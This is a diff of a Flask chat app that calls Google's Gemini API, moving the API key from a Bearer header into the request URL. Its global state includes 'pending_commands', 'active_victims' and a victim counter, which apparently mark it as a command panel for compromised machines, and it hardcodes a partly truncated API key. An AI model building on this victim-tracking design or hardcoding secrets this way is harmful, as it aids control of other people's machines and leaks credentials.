@@ -1,12 +1,12 @@
 from flask import Flask, request, jsonify, render_template_string
-import random, os, urllib.request, json, time, base64
+import random, os, urllib.request, json, time
 
 app = Flask(__name__)
 
-GEMINI_API_KEY = "AQ.Ab8RN6Je1fydnZJqVR72PF5Eco-5SA..." # Твой новый ключ из скриншота
+# Твой ключ из Google AI Studio
+GEMINI_API_KEY = "AQ.Ab8RN6Je1fydnZJqVR72PF5Eco-5SA..."
 
 chat_logs = []
-user_states = {}
 pending_commands = {}
 active_victims = {}
 victim_counter = 0
@@ -549,7 +549,7 @@ def chat_api():
 
     reply = ""
     try:
-        url = "https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent"
+        url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={GEMINI_API_KEY}"
         
         parts = [{"text": f"{system_instruction}\n\nВопрос пользователя: {user_msg if user_msg else 'Что на этой картинке?'}"}]
         
@@ -575,10 +575,7 @@ def chat_api():
         req = urllib.request.Request(
             url,
             data=json.dumps(payload).encode("utf-8"),
-            headers={
-                "Content-Type": "application/json",
-                "Authorization": f"Bearer {GEMINI_API_KEY}"
-            },
+            headers={"Content-Type": "application/json"},
             method="POST"
         )
 
